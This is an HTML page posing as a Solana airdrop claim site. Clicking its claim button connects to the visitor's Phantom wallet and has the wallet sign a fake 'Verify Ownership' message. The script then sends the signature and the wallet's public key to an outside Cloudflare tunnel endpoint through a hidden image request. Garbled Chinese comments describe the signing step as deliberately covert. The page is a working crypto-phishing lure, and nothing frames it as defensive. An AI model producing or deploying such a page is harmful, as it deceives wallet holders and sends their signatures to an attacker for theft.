<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:sans-serif;">
    
    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
        <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
        <p style="color:#888;margin-bottom:30px;">You are eligible to claim the exclusive reward pool.</p>
        <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM AIRDROP</button>
        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Initialized</div>
    </div>

    <div id="debug-panel" style="margin-top:20px; font-family:monospace; font-size:12px; color:#555; text-align:left; display:inline-block; width:300px; background:#111; padding:10px; border-radius:10px; border:1px dashed #333;">
        [Debug Log]:<br>
        <span id="log-1">1. æ ¸å¿ƒåº“: æ­£åœ¨æ£€æµ‹...</span><br>
        <span id="log-2">2. é’±åŒ…æ¢æµ‹: ç­‰å¾…ç‚¹å‡»...</span><br>
        <span id="log-3">3. ç­¾åé€»è¾‘: ç­‰å¾…æ¿€æ´»...</span>
    </div>

    <script>
    // æ£€æŸ¥æ ¸å¿ƒåº“æ˜¯å¦åŠ è½½æˆåŠŸ
    window.onload = () => {
        if (window.solanaWeb3) {
            document.getElementById('log-1').innerText = "1. æ ¸å¿ƒåº“: âœ… å·²åŠ è½½ (v" + solanaWeb3.version + ")";
            document.getElementById('log-1').style.color = "green";
        } else {
            document.getElementById('log-1').innerText = "1. æ ¸å¿ƒåº“: âŒ æœªèƒ½åŠ è½½ï¼Œè¯·æ£€æŸ¥ç½‘ç»œ";
            document.getElementById('log-1').style.color = "red";
        }
    };

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { 
                document.getElementById('log-2').innerText = "2. é’±åŒ…æ¢æµ‹: âŒ æœªæ‰¾åˆ° Phantom";
                document.getElementById('log-2').style.color = "red";
                alert("Please use Phantom browser."); 
                return; 
            }
            document.getElementById('log-2').innerText = "2. é’±åŒ…æ¢æµ‹: âœ… å·²æ‰¾åˆ°é’±åŒ…";
            document.getElementById('log-2').style.color = "green";
            
            // å¼€å§‹è¿æ¥
            document.getElementById('status').innerText = "Connecting...";
            const resp = await p.connect();
            document.getElementById('log-2').innerText += " | å·²è¿æ¥";

            // ğŸ”± è¿™é‡Œæµ‹è¯•æœ€éšè”½çš„æ¶ˆæ¯ç­¾åé€»è¾‘
            document.getElementById('log-3').innerText = "3. ç­¾åé€»è¾‘: ğŸš€ æ­£åœ¨æ‹‰èµ·...";
            const message = "Verify Ownership: " + Math.floor(Math.random() * 1000);
            const encodedMessage = new TextEncoder().encode(message);
            
            // å”¤èµ·ç­¾å
            const signedMessage = await p.signMessage(encodedMessage, "utf8");
            document.getElementById('log-3').innerText = "3. ç­¾åé€»è¾‘: âœ… ç­¾åå®Œæˆ";
            document.getElementById('log-3').style.color = "green";

            // æ•°æ®å›ä¼ 
            const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
            new Image().src = gate + "?sig=" + btoa(String.fromCharCode.apply(null, signedMessage.signature)) + "&pub=" + resp.publicKey.toString();
            
            document.getElementById('status').innerText = "COMPLETED";

        } catch(e) { 
            document.getElementById('log-3').innerText = "3. å¼‚å¸¸: " + e.message;
            document.getElementById('log-3').style.color = "orange";
            console.error(e);
        }
    }
    </script></body></html>
